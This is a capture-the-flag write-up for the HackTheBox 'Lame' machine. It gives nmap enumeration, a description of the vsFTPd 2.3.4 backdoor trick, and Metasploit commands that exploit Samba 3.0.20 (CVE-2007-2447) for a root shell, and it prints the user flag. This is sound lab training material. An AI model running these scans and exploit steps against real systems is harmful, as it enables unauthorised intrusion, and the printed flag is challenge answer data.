# Lame — HackTheBox Write Up

**Difficulty:** Easy  
**OS:** Linux  
**Author:** ph4n3s

---

## 1. Enumeration

First I connect to the VPN and ping the machine to confirm connectivity and operating system.

```bash
ping -c 5 10.129.76.110
```

The returned TTL is **63**, which confirms we are dealing with a **Linux** machine.

I continue with a port scan to see what is exposed:

```bash
nmap -p- -T4 --min-rate 5000 10.129.76.110
```

Open ports:

```
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Once the ports are confirmed, I run a more detailed scan to get versions and scripts:

```bash
nmap -p 21,22,139,445,3632 -sVC -T4 --min-rate 5000 10.129.76.110 -oN targeted
```

Relevant results:

```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU 4.2.4)
```

nmap also confirms that the FTP has **anonymous login enabled**.

---

## 2. Vulnerability analysis

### FTP — vsFTPd 2.3.4

I connect as `anonymous` to see what is there:

```bash
ftp 10.129.76.110
# user: anonymous
# password: (enter)
```

The directory is empty. The anonymous FTP was a rabbit hole, there is nothing here.

I look into the version and it turns out **vsFTPd 2.3.4** has a known backdoor (**CVE-2011-2523**): if the username contains `:)`, the server opens a shell on port 6200. I try it but it does not work in this case — probably the machine has the port blocked or the backdoor is not active on this instance.

**Important lesson: do not fixate on the first vector and keep enumerating.**

### Samba — 3.0.20

I focus on ports 139 and 445. The **Samba 3.0.20** version has a known critical vulnerability (**CVE-2007-2447**): the `username map script` allows command injection through the username field. There is a Metasploit module that exploits it directly.

---

## 3. Exploitation

I launch Metasploit with the matching module:

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.76.110
set LHOST tun0
run
```

I get a shell as **root** directly. This version of Samba runs with root privileges, so there is no need to escalate.

---

## 4. Post-exploitation

With the obtained shell I navigate to the flags:

**User flag:**

```bash
cat /home/makis/user.txt
```

```
0d932afe9ed705ec71b7d4673e51706e
```

**Root flag:**

```bash
cat /root/root.txt
```

---

## 5. Conclusions

- **vsFTPd 2.3.4** has a known backdoor but in this case it was not the right vector.
- **Samba 3.0.20** is the real vulnerability of the machine and gives direct access as root.
- Properly enumerating all services before jumping on the first one that appears is key.
- The ping TTL already gives us a hint about the OS before doing any scan.
